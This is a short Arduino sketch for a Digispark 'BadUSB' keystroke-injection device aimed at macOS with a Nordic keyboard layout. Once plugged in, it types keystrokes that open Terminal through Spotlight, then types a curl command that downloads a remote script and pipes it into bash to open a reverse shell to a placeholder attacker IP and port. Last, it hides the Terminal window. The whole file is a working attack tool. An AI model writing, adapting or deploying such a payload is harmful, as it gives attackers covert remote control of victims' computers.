// This script launches Spotlight to launch Terminal app in order to start a reverce shell to the attacker machine. 
// and the commands are made for a Finnish/nordic keyboard.  
// Tested on MacOS 11.1
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("terminal");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("curl /Ls git.io&vXd2N");
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_ALT_LEFT);
  DigiKeyboard.print("bash /s <attacker IP> <Attacker Port>");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_H, MOD_GUI_LEFT);

  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
